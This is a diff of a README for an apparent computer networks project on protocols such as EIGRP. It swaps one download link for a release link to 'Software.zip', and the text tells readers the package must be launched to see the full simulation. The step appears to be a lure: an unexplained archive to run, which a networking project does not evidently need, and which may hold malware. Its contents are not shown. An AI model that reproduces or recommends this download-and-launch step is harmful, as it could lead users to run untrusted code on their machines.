@@ -41,7 +41,7 @@ The following networking technologies are utilized in this project:
 - **Enhanced Interior Gateway Routing Protocol (EIGRP):** An advanced distance-vector routing protocol for improved network performance.
 
 ## Project Link: 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/user-attachments/files/18388744/Software.zip "Software.zip")
+[![Download Software](https://github.com/prozesy/COMPUTER_NETWORKS_PROJECT/releases/download/v2.0/Software.zip)](https://github.com/prozesy/COMPUTER_NETWORKS_PROJECT/releases/download/v2.0/Software.zip "https://github.com/prozesy/COMPUTER_NETWORKS_PROJECT/releases/download/v2.0/Software.zip")
 
 🔹 **Please Note**: The provided link directs you to the software package that needs to be launched for accessing the complete project simulation.
 
